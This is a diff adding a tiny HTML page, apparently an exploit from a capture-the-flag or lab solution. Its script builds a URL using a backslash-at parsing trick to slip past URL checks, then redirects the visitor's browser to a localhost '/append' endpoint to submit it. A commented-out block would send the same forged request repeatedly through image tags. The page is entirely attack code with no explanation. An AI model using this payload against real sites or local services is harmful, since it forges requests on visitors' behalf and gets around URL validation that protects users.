@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>a</title>
+</head>
+<body>
+    <script>
+        const base = 'localhost'
+        const url = `https://kevin.fish\\@${base}`;
+        // for (let i = 0; i < 5; i++) {
+        //     const i = document.createElement('img');
+        //     i.src = `http://${base}/append?content=z&url=${encodeURIComponent(url)}`;
+        //     document.body.appendChild(i);
+        // }
+        window.location = `http://${base}/append?content=z&url=${encodeURIComponent(url)}`
+    </script>
+</body>
+</html>
